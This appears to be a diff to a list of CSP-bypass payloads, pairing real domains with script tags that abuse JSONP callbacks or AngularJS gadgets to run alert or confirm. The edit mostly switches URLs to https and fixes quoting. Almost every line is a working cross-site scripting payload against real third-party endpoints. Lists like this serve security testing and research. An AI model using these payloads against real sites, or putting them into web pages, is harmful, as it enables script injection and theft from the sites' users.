@@ -129,7 +129,7 @@ www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"><
 yandex.st	<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test XSS</button>
 yastat.net	<body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 yastatic.net	<body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+yuedust.yuedu.126.net	<body ng-app ng-csp><script src="https://yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 cse.google.com  <script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
 accounts.google.com  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 maps.googleapis.com  <script src="https://maps.googleapis.com/maps/api/js?key=[REPLACE_BY_GOOGLE_API_KEY_FROM_CURRENT_WEBSITE]&callback=alert(1337)"></script>
@@ -137,19 +137,19 @@ www.blogger.com  <script src="https://www.blogger.com/feeds/5578653387562324002/
 translate.yandex.net  <script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)"></script>
 api-metrika.yandex.ru  <script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>
 api.vk.com  <script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
-app-sjint.marketo.com  <script src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
-app-e.marketo.com  <script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+app-sjint.marketo.com  <script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+app-e.marketo.com  <script src="https://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 detector.alicdn.com  <script src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"></script>
 suggest.taobao.com  <script src="https://suggest.taobao.com/sug?callback=alert(1337)"></script>
 count.tbcdn.cn  <script src="https://count.tbcdn.cn//counter3?callback=alert(1337)"></script>
 bebezoo.1688.com  <script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>
 wb.amap.com  <script src="https://wb.amap.com/channel.php?callback=alert(1337)"></script>
-a.sm.cn  <script src="http://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback=confirm(1);jsonp1"></script>
-api.m.sm.cn  <script src="http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3balert(1)%2f%2f794"></script>
+a.sm.cn  <script src="https://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback=confirm(1);jsonp1"></script>
+api.m.sm.cn  <script src="https://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3balert(1)%2f%2f794"></script>
 mkto.uber.com  <script src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"></script>
 mango.buzzfeed.com  <script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
-mempf.yahoo.co.jp  <script src=https://mempf.yahoo.co.jp/offer?position=h&callback=alert(1337)//></script>
-suggest-shop.yahooapis.jp  <script src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1337)//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-></script>
+mempf.yahoo.co.jp  <script src="https://mempf.yahoo.co.jp/offer?position=h&callback=alert(1337)//"></script>
+suggest-shop.yahooapis.jp  <script src="https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1337)//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-"></script>
 www.aol.com  <script src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>
 df-webservices.comet.aol.com  <script src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679"></script>
 api.cmi.aol.com  <script src="https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374"></script>
@@ -158,7 +158,7 @@ ads.yap.yahoo.com  <script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?
 search.yahoo.com  <script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>
 www.aol.com  <script src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>
 ui.comet.aol.com  <script src="https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback=confirm(9)//jQuery21307555521146732187_1538371213486&_=1538371213487"></script>
-portal.pf.aol.com  <script src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>
+portal.pf.aol.com  <script src="https://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>
 twitter.com  <script src="http://search.twitter.com/trends.json?callback=alert()"></script>
 twitter.com  <script src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()"></script>
 twitter.com  <script src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback=confirm()"></script>
